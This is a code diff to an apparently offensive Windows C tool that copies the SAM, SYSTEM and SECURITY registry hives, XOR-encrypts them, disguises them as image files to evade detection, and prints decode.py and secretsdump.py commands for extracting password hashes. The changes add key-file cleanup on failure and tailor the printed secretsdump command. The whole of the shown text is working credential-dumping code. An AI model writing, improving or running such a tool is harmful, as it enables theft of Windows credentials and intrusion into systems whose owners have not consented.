@@ -833,6 +833,7 @@ int wmain(int argc, wchar_t *argv[])
             GenXorKey(sysKey);
             if (WriteKeyFile(sysOut, sysKey)) {
                 sysOk = DisguiseAsImage(sysTmp, sysOut, sysKey);
+                if (!sysOk) DeleteKeyFile(sysOut);
             } else {
                 wprintf(L"  [!] key file write failed, plaintext %ls kept\n", sysTmp);
                 sysOk = FALSE;
@@ -843,6 +844,7 @@ int wmain(int argc, wchar_t *argv[])
             GenXorKey(secKey);
             if (WriteKeyFile(secOut, secKey)) {
                 secOk = DisguiseAsImage(secTmp, secOut, secKey);
+                if (!secOk) DeleteKeyFile(secOut);
             } else {
                 wprintf(L"  [!] key file write failed, plaintext %ls kept\n", secTmp);
                 secOk = FALSE;
@@ -875,8 +877,12 @@ int wmain(int argc, wchar_t *argv[])
         if (secWanted && secOk)
             wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", secOut, secOut);
     }
-    if (samOk || sysOk || (secWanted && secOk))
-        wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n\n");
+    if (samOk || sysOk || (secWanted && secOk)) {
+        if (secWanted && secOk)
+            wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n\n");
+        else
+            wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv LOCAL\n\n");
+    }
 
     BOOL allOk = (!samWanted || samOk) && (!sysWanted || sysOk) &&
                  (!secWanted || secOk);
